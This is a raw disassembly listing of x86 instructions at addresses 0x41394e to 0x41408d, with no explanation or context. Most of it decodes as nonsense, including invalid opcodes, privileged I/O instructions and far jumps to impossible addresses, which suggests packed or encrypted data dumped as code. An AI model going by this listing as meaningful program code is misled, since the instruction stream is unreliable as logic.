  41394e:	xchg   edx,eax
  41394f:	icebp  
  413950:	push   ebx
  413951:	pop    edi
  413952:	mov    ecx,0x3f032b83
  413957:	pop    esp
  413958:	mov    cl,0x51
  41395a:	mov    dl,0x20
  41395c:	mov    esi,0x7e11f2cb
  413961:	mov    dh,0xef
  413963:	outs   dx,BYTE PTR ds:[esi]
  413964:	and    edi,DWORD PTR [ebx-0x6a]
  413967:	es sbb eax,0x8cf08891
  41396d:	retf   
  41396e:	les    ecx,FWORD PTR [ebx+esi*8]
  413971:	inc    esp
  413972:	int3   
  413973:	jge    0x413942
  413975:	fst    DWORD PTR [edi+0x6dcef8d2]
  41397b:	mov    cl,0xfd
  41397d:	xor    DWORD PTR [ebp+0x10f81baa],edi
  413983:	or     eax,0x2edcca55
  413988:	out    dx,al
  413989:	pop    edx
  41398a:	mov    ds:0x619af63b,al
  41398f:	cdq    
  413990:	mov    ds:0xfbed8fb5,al
  413995:	jbe    0x4139d3
  413997:	xchg   ecx,eax
  413998:	pop    edx
  413999:	data16 or BYTE PTR [edx-0x18],0xcd
  41399e:	ds inc ebx
  4139a0:	not    BYTE PTR [eax-0x327f9f33]
  4139a6:	in     al,0x25
  4139a8:	scas   al,BYTE PTR es:[edi]
  4139a9:	xchg   DWORD PTR [ebp-0xb],esp
  4139ac:	mov    eax,ds:0xa51ea2b7
  4139b1:	jmp    0x1a5ab54a
  4139b6:	js     0x4139e8
  4139b8:	pushf  
  4139b9:	add    ah,dl
  4139bb:	(bad)
  4139bf:	xchg   ebx,eax
  4139c0:	call   0x517f:0x7db73c6d
  4139c7:	dec    eax
  4139c8:	sbb    ah,dl
  4139ca:	pop    esp
  4139cb:	ins    BYTE PTR es:[edi],dx
  4139cc:	enter  0x56c0,0x31
  4139d0:	adc    ah,dh
  4139d2:	jne    0x413956
  4139d4:	stos   DWORD PTR es:[edi],eax
  4139d5:	rcr    BYTE PTR [eax+0x67],cl
  4139d8:	xlat   BYTE PTR ds:[ebx]
  4139d9:	dec    ebx
  4139da:	hlt    
  4139db:	ror    BYTE PTR [ebx+ebp*2],1
  4139de:	jne    0x413977
  4139e0:	mov    ebx,0x36b0847d
  4139e5:	adc    ah,BYTE PTR [di]
  4139e8:	lahf   
  4139e9:	mov    ebx,ebx
  4139eb:	sbb    ch,BYTE PTR [ebx-0x37]
  4139ee:	dec    ebx
  4139ef:	mov    edx,0x9448d0c7
  4139f4:	or     edi,esi
  4139f6:	pop    ebx
  4139f7:	mov    dl,0xd5
  4139f9:	push   cs
  4139fa:	jmp    0x3788913e
  4139ff:	icebp  
  413a00:	xor    BYTE PTR [ebp-0x13],bh
  413a03:	push   esi
  413a04:	daa    
  413a05:	loop   0x413a1b
  413a07:	jmp    DWORD PTR [ebx+edi*2+0x31]
  413a0b:	stc    
  413a0c:	je     0x413a75
  413a0e:	test   al,0xba
  413a11:	mov    eax,0x9ab5e603
  413a16:	setne  BYTE PTR [edx+0x41699280]
  413a1d:	inc    edi
  413a1e:	jge    0x413a13
  413a20:	gs xchg edi,eax
  413a22:	bound  ebp,QWORD PTR [eax]
  413a24:	(bad)  
  413a25:	clc    
  413a26:	xchg   ecx,eax
  413a27:	ret    
  413a28:	ror    BYTE PTR [esp+edi*1],cl
  413a2b:	aad    0xcb
  413a2d:	jnp    0x4139ef
  413a2f:	xchg   ebx,eax
  413a30:	push   es
  413a31:	jns    0x413a19
  413a33:	adc    DWORD PTR [esi],edi
  413a35:	addr16 xchg ebp,eax
  413a37:	mov    WORD PTR [ecx-0x19],es
  413a3a:	(bad)  
  413a3b:	push   0x46ec155c
  413a40:	lds    ebp,FWORD PTR [ecx+0x40]
  413a43:	fmul   DWORD PTR [ebp+0x6c]
  413a46:	dec    eax
  413a47:	fsubr  QWORD PTR [esi+0x96f6fde]
  413a4d:	cvtpi2ps xmm1,QWORD PTR [eax]
  413a50:	sub    DWORD PTR [ebp+0x7a],edx
  413a53:	stc    
  413a54:	push   ecx
  413a55:	push   edi
  413a56:	hlt    
  413a57:	push   esp
  413a58:	lods   eax,DWORD PTR ds:[esi]
  413a59:	xor    edx,esp
  413a5b:	sub    al,0xf
  413a5d:	lods   eax,DWORD PTR ds:[esi]
  413a5e:	and    DWORD PTR [edx],ebp
  413a60:	rol    DWORD PTR [edi],1
  413a62:	jo     0x413a23
  413a64:	sub    bh,BYTE PTR [edx]
  413a66:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  413a68:	sub    BYTE PTR [ebx],ah
  413a6a:	mov    DWORD PTR [esi],eax
  413a6c:	dec    esi
  413a6d:	jo     0x413a59
  413a6f:	stos   DWORD PTR es:[edi],eax
  413a70:	ficomp DWORD PTR [edi+0x68]
  413a73:	pop    edx
  413a74:	xchg   edx,eax
  413a75:	dec    ebx
  413a76:	mov    cl,0x3b
  413a78:	cmp    DWORD PTR [eax-0x7d9cb7d7],esp
  413a7e:	rcl    edi,cl
  413a80:	aad    0x2a
  413a82:	enter  0x979f,0xda
  413a86:	aad    0xa6
  413a88:	lds    ebx,FWORD PTR [ebx+0x36bbad2d]
  413a8e:	icebp  
  413a8f:	jmp    0xd9ce775e
  413a94:	ds cdq 
  413a96:	and    cl,dh
  413a98:	adc    BYTE PTR [bx+0x26],bl
  413a9c:	mov    eax,0xa261a580
  413aa1:	fbstp  TBYTE PTR [eax-0x1c]
  413aa4:	mov    ds:0xe9717263,al
  413aa9:	hlt    
  413aaa:	and    BYTE PTR [ecx+0x5b],0xc0
  413aae:	push   ebp
  413aaf:	(bad)  
  413ab0:	les    ebp,FWORD PTR [esi+0x4a06ba73]
  413ab6:	stc    
  413ab7:	sub    edx,DWORD PTR [edx]
  413ab9:	cmp    DWORD PTR [ecx+0x13],0xc5348d05
  413ac0:	jnp    0x413b02
  413ac2:	dec    ebx
  413ac3:	je     0x413b37
  413ac5:	cmp    DWORD PTR [edi+0x62],ebp
  413ac8:	sub    al,0x88
  413aca:	icebp  
  413acb:	out    dx,al
  413acc:	or     al,0xd8
  413ace:	and    al,0x2
  413ad0:	mov    ah,0x20
  413ad2:	xchg   edx,eax
  413ad3:	pop    ebx
  413ad4:	xlat   BYTE PTR ds:[ebx]
  413ad5:	popa   
  413ad6:	xor    DWORD PTR [edx-0x15dd1453],edi
  413adc:	neg    DWORD PTR [eax+eiz*1]
  413adf:	or     al,0x7e
  413ae1:	ror    DWORD PTR [ecx+0x6cda2678],cl
  413ae7:	adc    DWORD PTR [ebp-0xff7bfc0],ebp
  413aed:	sub    eax,0xd91b82a
  413af2:	xchg   ecx,eax
  413af3:	mov    eax,ds:0xbafcb9c6
  413af8:	lods   eax,DWORD PTR ds:[esi]
  413af9:	push   eax
  413afa:	(bad)  
  413afb:	div    dl
  413afd:	mov    ch,0xe7
  413aff:	retf   0xf1fd
  413b02:	mov    eax,ds:0x27d237c0
  413b07:	mov    al,0xdd
  413b09:	jecxz  0x413aa9
  413b0b:	adc    al,0xaa
  413b0d:	xchg   esi,eax
  413b0e:	add    DWORD PTR [ecx-0x5aad16c0],ecx
  413b14:	outs   dx,BYTE PTR ds:[esi]
  413b15:	mov    ch,0x53
  413b17:	cmp    edi,esp
  413b19:	or     eax,0x8155a17e
  413b1e:	cmp    al,0x28
  413b20:	jb     0x413b91
  413b22:	ret    0x9919
  413b25:	lds    esp,FWORD PTR [edx-0x6e306a6c]
  413b2b:	sub    ebx,DWORD PTR [esi]
  413b2d:	pop    ebp
  413b2e:	pop    esp
  413b2f:	push   edi
  413b30:	leave  
  413b31:	(bad)  
  413b32:	loop   0x413ac4
  413b34:	pop    ds
  413b35:	inc    ebp
  413b36:	ins    DWORD PTR es:[edi],dx
  413b37:	in     eax,0x1d
  413b39:	sbb    ebp,esi
  413b3b:	inc    esp
  413b3c:	adc    al,0x49
  413b3e:	sbb    eax,0xc548746a
  413b43:	fdivp  st(1),st
  413b45:	mov    ds:0x7322c381,al
  413b4a:	sbb    al,ah
  413b4c:	pop    es
  413b4d:	xchg   DWORD PTR [ebx+0x69],esi
  413b50:	sbb    BYTE PTR [ebx-0x67],ah
  413b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b54:	dec    ecx
  413b55:	sbb    ecx,DWORD PTR [edi]
  413b57:	sbb    al,0x27
  413b59:	inc    ebx
  413b5a:	data16 arpl WORD PTR ds:0xcd53efcf,di
  413b61:	xchg   BYTE PTR [ecx-0xe68bf82],dl
  413b67:	add    edi,DWORD PTR [edx+0x41f0cc18]
  413b6d:	and    al,0x89
  413b6f:	cmp    BYTE PTR [esi+0x6b],ah
  413b72:	cmp    ah,BYTE PTR [ecx-0x21d06fef]
  413b78:	push   es
  413b79:	sub    bl,ch
  413b7b:	pop    eax
  413b7c:	(bad)  
  413b7e:	out    0xaf,al
  413b80:	pop    ss
  413b81:	mov    ecx,0xa2aab56c
  413b86:	add    edi,DWORD PTR [ebp-0x62fb24cd]
  413b8c:	sbb    DWORD PTR [edi+edi*1-0xcc6c1aa],eax
  413b93:	scas   al,BYTE PTR es:[edi]
  413b94:	or     edi,DWORD PTR [ebx-0xb]
  413b97:	mov    al,ds:0x8d75c6df
  413b9c:	in     eax,0x3c
  413b9e:	dec    edx
  413ba0:	fbld   TBYTE PTR [edx+eax*8+0x30044ccc]
  413ba7:	sbb    edx,DWORD PTR [edi]
  413ba9:	fbstp  TBYTE PTR [ebx]
  413bab:	xchg   edx,eax
  413bac:	popa   
  413bad:	pop    esp
  413bae:	dec    esi
  413baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bb0:	push   es
  413bb1:	test   DWORD PTR [esi+0x65b19e7c],ebp
  413bb7:	and    dl,BYTE PTR [ecx-0x5a]
  413bba:	js     0x413bed
  413bbc:	jns    0x413c27
  413bbe:	fmul   DWORD PTR [esi-0x4765644d]
  413bc4:	mov    cl,0x9c
  413bc6:	xor    cl,BYTE PTR [ebx]
  413bc8:	fld    TBYTE PTR [edi]
  413bca:	cmp    al,0xea
  413bcc:	fimul  WORD PTR [ebx]
  413bce:	push   ecx
  413bcf:	jle    0x413c2d
  413bd1:	pop    es
  413bd2:	cmp    BYTE PTR [ebx],ch
  413bd4:	push   edx
  413bd5:	pop    ss
  413bd6:	dec    edx
  413bd7:	add    DWORD PTR ds:0x44998e4e,0x2a861f3a
  413be1:	xchg   edi,eax
  413be2:	ins    BYTE PTR es:[edi],dx
  413be3:	out    0x47,al
  413be5:	aas    
  413be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413be7:	iret   
  413be8:	aas    
  413be9:	add    ebx,edi
  413beb:	cs mov esp,0xdda96532
  413bf1:	adc    ebx,DWORD PTR [esi+0x2db2878a]
  413bf7:	fist   DWORD PTR [edx]
  413bf9:	into   
  413bfa:	pushf  
  413bfb:	sub    al,0x87
  413bfd:	dec    eax
  413bfe:	xor    esi,0x33a67af6
  413c04:	outs   dx,DWORD PTR ds:[esi]
  413c05:	cmc    
  413c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c07:	mov    ebx,0x20fa8138
  413c0c:	push   0x5201cf95
  413c11:	arpl   ax,di
  413c13:	mov    ah,0x1e
  413c15:	lods   eax,DWORD PTR ds:[esi]
  413c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c17:	int    0x9
  413c19:	inc    ebp
  413c1a:	pop    ss
  413c1b:	into   
  413c1c:	sbb    dl,cl
  413c1e:	stc    
  413c1f:	xor    DWORD PTR [ebx-0x2e],0xadd2f06b
  413c26:	mov    dh,BYTE PTR ds:0x5fe0e8f8
  413c2c:	xchg   ecx,eax
  413c2d:	or     eax,0xe03d7964
  413c32:	push   es
  413c33:	add    ebp,esi
  413c35:	bound  edx,QWORD PTR [edx+0x5a]
  413c38:	mov    esp,?
  413c3a:	and    al,0x4c
  413c3c:	ss js  0x413c7d
  413c3f:	lds    ebx,FWORD PTR [esi+0x8]
  413c42:	in     al,0x2b
  413c44:	cmp    DWORD PTR [eax+eiz*8+0x2c],ecx
  413c48:	sbb    ebx,ebx
  413c4a:	fsubr  QWORD PTR [ecx-0x77]
  413c4d:	scas   al,BYTE PTR es:[edi]
  413c4e:	mov    ah,BYTE PTR [eax]
  413c50:	fisubr DWORD PTR [eax-0x7b]
  413c53:	dec    ebp
  413c54:	inc    ecx
  413c55:	ss call 0x15e6a2eb
  413c5b:	xchg   ebx,eax
  413c5c:	fld    DWORD PTR [edi]
  413c5e:	adc    al,BYTE PTR [edx+0x72]
  413c61:	push   edx
  413c62:	scas   eax,DWORD PTR es:[edi]
  413c63:	pop    ebp
  413c64:	repnz cmp cl,BYTE PTR es:[ecx+0x6ed417ca]
  413c6c:	pop    es
  413c6d:	test   eax,0xeb818860
  413c72:	inc    ebx
  413c73:	hlt    
  413c74:	adc    eax,0x7154f01e
  413c79:	dec    eax
  413c7a:	cli    
  413c7b:	sbb    ch,BYTE PTR [edx]
  413c7d:	sahf   
  413c7e:	ins    BYTE PTR es:[edi],dx
  413c7f:	adc    BYTE PTR [esi+0x37],bh
  413c82:	(bad)  
  413c83:	mov    esp,0x7ea7ce2d
  413c88:	jbe    0x413c7c
  413c8a:	cdq    
  413c8b:	pusha  
  413c8c:	pop    edi
  413c8d:	push   edx
  413c8e:	push   edi
  413c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c91:	push   eax
  413c92:	mov    dl,0x11
  413c94:	mov    dl,0x3c
  413c96:	xor    al,0x5c
  413c98:	shl    BYTE PTR [edi-0x5751f76c],0x85
  413c9f:	xor    ebp,DWORD PTR [ebp+0x8a3fd6]
  413ca5:	hlt    
  413ca6:	pop    edx
  413ca7:	aad    0xc5
  413ca9:	fidivr DWORD PTR [ebx]
  413cab:	add    edx,DWORD PTR [eax]
  413cad:	mov    ecx,DWORD PTR [ebp-0x28]
  413cb0:	adc    ebx,DWORD PTR [eax+0x4]
  413cb3:	push   0x2
  413cb5:	xor    ebx,esi
  413cb7:	mov    esi,DWORD PTR [ebp-0x24]
  413cba:	pop    esi
  413cbb:	sub    esi,ecx
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	cmp    BYTE PTR [eax],cl
  413d00:	mov    bh,0x7c
  413d02:	mov    DWORD PTR [edx],esi
  413d04:	sbb    BYTE PTR [eax],bl
  413d06:	stos   BYTE PTR es:[edi],al
  413d07:	adc    bl,BYTE PTR [eax]
  413d09:	sbb    BYTE PTR [edi],bh
  413d0b:	sahf   
  413d0c:	xchg   esp,eax
  413d0d:	loopne 0x413cf6
  413d0f:	ja     0x413cbc
  413d11:	lods   al,BYTE PTR ds:[esi]
  413d12:	dec    edx
  413d13:	aaa    
  413d14:	repnz mov al,ds:0x575dddc2
  413d1a:	sahf   
  413d1b:	push   eax
  413d1c:	jmp    0x413cc9
  413d1e:	or     DWORD PTR [ebx+0x346dc66],esi
  413d24:	ins    BYTE PTR es:[edi],dx
  413d25:	(bad)  
  413d26:	pop    ebx
  413d27:	inc    eax
  413d28:	sub    BYTE PTR [ecx-0x5d5ec248],bh
  413d2e:	out    0x3c,al
  413d30:	mov    DWORD PTR [ecx+0x411eb296],ebx
  413d36:	and    DWORD PTR [eax+0x7e],ebp
  413d39:	add    DWORD PTR [eax+0x6f77742a],eax
  413d3f:	add    DWORD PTR [ebx+0xf],esi
  413d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d43:	cwde   
  413d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d46:	cmp    BYTE PTR [edx+eiz*2+0x5bfa69b5],ah
  413d4d:	scas   eax,DWORD PTR es:[edi]
  413d4e:	sub    ch,BYTE PTR [ebx]
  413d50:	sar    DWORD PTR [ebx-0x8],0xf6
  413d54:	inc    esp
  413d55:	gs (bad) 
  413d57:	ins    BYTE PTR es:[edi],dx
  413d58:	sub    edx,edx
  413d5a:	xor    DWORD PTR [ecx+0x5f],ebp
  413d5d:	das    
  413d5e:	daa    
  413d5f:	sbb    ebp,DWORD PTR [edi-0x601d6aa8]
  413d65:	mov    cl,0x17
  413d67:	sub    eax,0xda867579
  413d6c:	not    edx
  413d6e:	test   BYTE PTR [edi+eax*1+0x1],bl
  413d72:	jae    0x413db7
  413d74:	jle    0x413d14
  413d76:	jmp    0x413da7
  413d78:	inc    eax
  413d79:	sub    BYTE PTR [edi],bh
  413d7b:	es sti 
  413d7d:	add    cl,BYTE PTR [ecx+0x3046a876]
  413d83:	test   bh,cl
  413d85:	ja     0x413d1e
  413d87:	test   DWORD PTR [edx+0x78f76404],eax
  413d8d:	(bad)  
  413d8f:	iret   
  413d90:	retf   0xcc3d
  413d93:	vpxor  xmm7,xmm1,XMMWORD PTR [esi+0x317fe583]
  413d9b:	hlt    
  413d9c:	int    0xb6
  413d9e:	cmp    al,0x6d
  413da0:	rcl    edi,0xac
  413da3:	mov    esi,0x2186bb82
  413da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413da9:	jne    0x413d80
  413dab:	mov    cl,0x83
  413dad:	(bad)  
  413dae:	and    dh,BYTE PTR [esi]
  413db0:	iret   
  413db1:	leave  
  413db2:	in     eax,dx
  413db3:	icebp  
  413db4:	sar    BYTE PTR [edx-0x39],0xf9
  413db8:	xchg   BYTE PTR [edx-0x7],ah
  413dbb:	stos   DWORD PTR es:[edi],eax
  413dbc:	fidivr WORD PTR [edx]
  413dbe:	ror    edi,0x0
  413dc1:	cmp    eax,0xa6469bd8
  413dc6:	xchg   ebx,eax
  413dc7:	and    bh,BYTE PTR [edx+0x71]
  413dca:	iret   
  413dcb:	shl    DWORD PTR [ecx],cl
  413dcd:	ficom  DWORD PTR [ebp-0x50]
  413dd0:	pop    ss
  413dd1:	jmp    0x2a9d67e9
  413dd6:	cmp    dh,ch
  413dd8:	fidivr WORD PTR [edx+0x20077945]
  413dde:	outs   dx,BYTE PTR ds:[esi]
  413ddf:	clc    
  413de0:	or     esp,DWORD PTR [edx-0x48]
  413de3:	dec    esp
  413de4:	add    al,0xb2
  413de6:	adc    bh,BYTE PTR [ebx-0x12c09df8]
  413dec:	stos   DWORD PTR es:[edi],eax
  413ded:	gs pop ds
  413def:	fld    QWORD PTR [esi-0x5e]
  413df2:	cmc    
  413df3:	mov    bl,0xae
  413df5:	or     edx,DWORD PTR [esi]
  413df7:	adc    al,0x40
  413df9:	enter  0xe8cb,0x76
  413dfd:	fadd   QWORD PTR [ebp-0x38]
  413e00:	mov    esi,0x1451b8e1
  413e05:	inc    edi
  413e06:	pop    edx
  413e07:	rcl    DWORD PTR [eax+eiz*2+0x57c35f78],cl
  413e0e:	mov    eax,ds:0x327351a
  413e13:	aaa    
  413e14:	or     ah,cl
  413e16:	out    dx,al
  413e17:	mov    ecx,0x44520bc4
  413e1c:	jne    0x413e11
  413e1e:	aas    
  413e1f:	mov    bh,0xff
  413e21:	adc    DWORD PTR [edi+0x7584e52d],ecx
  413e27:	jnp    0x413e6d
  413e29:	(bad)  
  413e2a:	cmp    DWORD PTR [eax-0x52],ebp
  413e2d:	pushaw 
  413e2f:	adc    BYTE PTR [eax-0x2a],bl
  413e32:	fadd   QWORD PTR [ebp+0x2582591e]
  413e38:	jbe    0x413e09
  413e3a:	icebp  
  413e3b:	inc    ebp
  413e3c:	mov    dh,0x52
  413e3e:	push   ss
  413e3f:	stc    
  413e40:	jmp    0x1d13e111
  413e45:	sahf   
  413e46:	imul   edi,DWORD PTR [edx+0x25],0x5e9219df
  413e4d:	std    
  413e4e:	fmul   DWORD PTR [edi-0x2c]
  413e51:	cdq    
  413e52:	xchg   ebp,eax
  413e53:	test   eax,0xa7896427
  413e58:	bound  ecx,QWORD PTR [ecx-0x3d4baa1e]
  413e5e:	push   edi
  413e5f:	ja     0x413eb5
  413e61:	xchg   BYTE PTR ds:0xe6d67f9c,bh
  413e67:	out    dx,al
  413e68:	lods   al,BYTE PTR ds:[esi]
  413e6a:	icebp  
  413e6b:	mov    bl,BYTE PTR [ecx+edi*4+0x49]
  413e6f:	out    dx,al
  413e70:	sbb    DWORD PTR [esi],edx
  413e72:	(bad)  
  413e73:	pop    ss
  413e74:	lock outs dx,BYTE PTR ds:[esi]
  413e76:	repnz lods al,BYTE PTR ds:[esi]
  413e78:	sub    DWORD PTR [edi+0x23],ecx
  413e7b:	inc    edi
  413e7c:	loope  0x413e49
  413e7e:	into   
  413e7f:	iret   
  413e80:	sub    eax,0xf8c783bc
  413e85:	std    
  413e86:	in     al,dx
  413e87:	add    BYTE PTR [ecx-0x44f7f2c2],bh
  413e8d:	aaa    
  413e8e:	sahf   
  413e8f:	std    
  413e90:	(bad)  
  413e91:	sbb    ebx,ebx
  413e93:	clc    
  413e94:	jmp    0x413f09
  413e96:	jnp    0x413e7e
  413e98:	sub    DWORD PTR [ecx-0x2c],ebx
  413e9b:	mov    ds:0xb77ff090,al
  413ea0:	sub    al,0x86
  413ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ea3:	jb     0x413edd
  413ea5:	(bad)  
  413ea8:	push   ss
  413ea9:	mov    ch,0x25
  413eab:	pusha  
  413eac:	nop
  413ead:	loope  0x413ec9
  413eaf:	push   edx
  413eb0:	inc    edi
  413eb1:	add    si,WORD PTR [edx+0x2]
  413eb5:	sbb    BYTE PTR [eax],dl
  413eb7:	clc    
  413eb8:	pop    es
  413eb9:	push   ds
  413eba:	std    
  413ebb:	out    0x21,al
  413ebd:	xor    eax,0x5248db31
  413ec2:	nop
  413ec3:	push   eax
  413ec4:	jmp    0x447c:0x65095444
  413ecb:	daa    
  413ecc:	fs icebp 
  413ece:	fadd   DWORD PTR [ecx+0x4d]
  413ed1:	ja     0x413e91
  413ed3:	out    dx,eax
  413ed4:	fistp  DWORD PTR [eax+0x50]
  413ed7:	mov    edx,0x2083212d
  413edc:	jo     0x413eb6
  413ede:	ss xchg ebx,eax
  413ee0:	es xchg esp,eax
  413ee2:	or     ecx,DWORD PTR [edi+0x6c]
  413ee5:	sar    DWORD PTR [ecx-0x6ada82cd],1
  413eeb:	sahf   
  413eec:	mov    al,ds:0x519bbfb7
  413ef1:	aas    
  413ef2:	aas    
  413ef3:	cmc    
  413ef4:	daa    
  413ef5:	in     eax,0x47
  413ef7:	aam    0x4a
  413ef9:	(bad)  
  413efb:	xchg   BYTE PTR [ebp+ebx*8+0x3f],dh
  413eff:	scas   al,BYTE PTR es:[edi]
  413f00:	lahf   
  413f01:	adc    bl,ch
  413f03:	jbe    0x413f48
  413f05:	sub    ebp,edi
  413f07:	dec    ebp
  413f08:	test   BYTE PTR [edi-0x46],ah
  413f0b:	jmp    0x413ebe
  413f0d:	cmp    BYTE PTR [edi],al
  413f0f:	lock lods eax,DWORD PTR ds:[esi]
  413f11:	jno    0x413ea9
  413f13:	addr16 data16 das 
  413f16:	dec    ebx
  413f17:	add    al,0x93
  413f19:	mov    esp,0x954ef76e
  413f1e:	pop    eax
  413f1f:	xchg   BYTE PTR ds:0xa8fab4eb,bh
  413f25:	sti    
  413f26:	jecxz  0x413f57
  413f28:	aas    
  413f29:	in     al,dx
  413f2a:	test   al,0xa8
  413f2c:	and    cl,BYTE PTR [edx-0x6fbbdc38]
  413f32:	sub    eax,0x8a4876c4
  413f37:	data16 xor al,0xf0
  413f3a:	mov    dl,0xb2
  413f3c:	sahf   
  413f3d:	inc    eax
  413f3e:	imul   edi,DWORD PTR [esi-0x36],0xffffffa3
  413f42:	and    BYTE PTR [edx+0x26],bl
  413f45:	xchg   ebp,eax
  413f46:	add    eax,0xa01c8ac1
  413f4b:	push   edx
  413f4c:	xor    DWORD PTR [edi],ebp
  413f4e:	xor    ah,cl
  413f50:	add    ebp,DWORD PTR [ebx]
  413f52:	xchg   BYTE PTR [ebx],bh
  413f54:	enter  0x7fe0,0x1
  413f58:	sbb    DWORD PTR [ecx-0x34553134],ecx
  413f5e:	jo     0x413fb0
  413f60:	scas   eax,DWORD PTR es:[edi]
  413f61:	xchg   ecx,eax
  413f62:	mov    esi,0x1e8781c
  413f67:	pop    esp
  413f68:	gs dec ecx
  413f6a:	int    0x2d
  413f6c:	stos   DWORD PTR es:[edi],eax
  413f6d:	mov    DWORD PTR [bx+si-0x67c3],esi
  413f72:	clc    
  413f73:	fnstcw WORD PTR [ecx-0x36]
  413f76:	rol    BYTE PTR [esi],0xb
  413f79:	adc    al,BYTE PTR [esi-0x42]
  413f7c:	in     eax,dx
  413f7d:	jl     0x413f5f
  413f7f:	push   eax
  413f80:	cmp    bl,BYTE PTR [eax-0x6e]
  413f83:	sbb    DWORD PTR [edx],edx
  413f85:	or     ch,BYTE PTR [edi]
  413f87:	pop    edx
  413f88:	sbb    al,0xa0
  413f8a:	push   ebp
  413f8b:	loope  0x413f65
  413f8d:	mov    ebp,0x121da344
  413f92:	cmp    al,0x6c
  413f94:	xor    BYTE PTR [ebx+0x7],ch
  413f97:	push   0xffffffde
  413f99:	sbb    dh,BYTE PTR [eax+edx*2-0x56]
  413f9d:	xor    bl,dl
  413f9f:	paddsw mm1,QWORD PTR [edx+ebx*8+0x645ba536]
  413fa7:	test   eax,0xd013e6a6
  413fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fad:	xor    BYTE PTR [ecx-0x45],0x15
  413fb1:	pop    es
  413fb2:	mov    dl,0x9b
  413fb4:	xchg   edx,eax
  413fb5:	push   ebp
  413fb6:	test   BYTE PTR [eax],al
  413fb8:	icebp  
  413fb9:	dec    ebp
  413fba:	dec    esi
  413fbb:	push   cs
  413fbc:	push   ss
  413fbd:	scas   eax,DWORD PTR es:[edi]
  413fbe:	nop
  413fbf:	xor    eax,0x4c41c6b7
  413fc4:	dec    ebx
  413fc5:	pop    edx
  413fc6:	ja     0x413fc2
  413fc8:	int3   
  413fc9:	in     eax,dx
  413fca:	ret    0x1e52
  413fcd:	or     BYTE PTR [edx],bh
  413fcf:	xchg   esp,eax
  413fd0:	stos   DWORD PTR es:[edi],eax
  413fd1:	loope  0x413fd0
  413fd3:	rcl    DWORD PTR [ebx-0x62],cl
  413fd6:	(bad)  
  413fd8:	push   0x31
  413fda:	and    ebx,esp
  413fdc:	popf   
  413fdd:	dec    ebp
  413fde:	xchg   esp,eax
  413fdf:	mov    ecx,DWORD PTR [ecx-0xb4fb058]
  413fe5:	sub    al,0x96
  413fe7:	outs   dx,BYTE PTR ds:[esi]
  413fe8:	push   0xffffffe8
  413fea:	int3   
  413feb:	mov    ebx,0x16b9ddd
  413ff0:	inc    esp
  413ff1:	test   BYTE PTR [ebx-0xd],dh
  413ff4:	and    BYTE PTR [esi+ecx*2+0x7e6371bc],al
  413ffb:	(bad)  [esi]
  413ffd:	repz int 0x71
  414000:	ss pop ebp
  414002:	xchg   ecx,eax
  414003:	inc    esp
  414004:	inc    eax
  414005:	jne    0x413f95
  414007:	iret   
  414008:	pop    esi
  414009:	leave  
  41400a:	addr16 into 
  41400c:	and    al,0x5a
  41400e:	imul   edi,DWORD PTR [ebx],0xe39f6642
  414014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414015:	or     al,0x7f
  414017:	addr16 or al,0x1f
  41401a:	nop
  41401b:	es popf 
  41401d:	xchg   ecx,eax
  41401e:	sbb    esp,ebp
  414020:	outs   dx,BYTE PTR ds:[esi]
  414021:	test   al,0x19
  414023:	mov    BYTE PTR [esi+eiz*4-0x7a6345fb],dh
  41402a:	pop    edi
  41402b:	mov    esi,ebx
  41402d:	ret    0xeb60
  414030:	loope  0x414002
  414032:	mov    edi,0x424eb375
  414037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414038:	int3   
  414039:	jecxz  0x413fc4
  41403b:	push   es
  41403c:	adc    BYTE PTR [esi+0x48ab633],cl
  414042:	fidiv  DWORD PTR [edi]
  414044:	clc    
  414045:	dec    esi
  414046:	or     DWORD PTR [ebx-0x5cd3419b],0xffffffa6
  41404d:	popa   
  41404e:	gs mov dh,0x8e
  414051:	cli    
  414052:	ds mov esi,es
  414055:	sub    DWORD PTR [edi-0x25],edx
  414058:	mov    bl,0xd6
  41405a:	mov    edx,ecx
  41405c:	enter  0x825a,0xa7
  414060:	xchg   edi,eax
  414061:	inc    ebp
  414062:	push   cs
  414063:	popf   
  414064:	lahf   
  414065:	xlat   BYTE PTR ds:[ebx]
  414066:	mov    dh,0x6f
  414068:	inc    edi
  414069:	bound  ebp,QWORD PTR [ecx+0x6d]
  41406c:	push   0xffffffb1
  41406e:	out    dx,eax
  41406f:	aam    0xcf
  414071:	push   esi
  414072:	fmulp  st(1),st
  414074:	frstpm(287 only) 
  414076:	add    DWORD PTR [edx],esp
  414078:	cmp    cl,bl
  41407a:	xor    al,0xaa
  41407c:	jmp    0x41403f
  41407e:	out    dx,al
  41407f:	(bad)  [ecx-0x5c]
  414082:	mov    eax,ds:0x4c99fee
  414087:	or     DWORD PTR [ebp+0x757db173],eax
  41408d:	cdq    
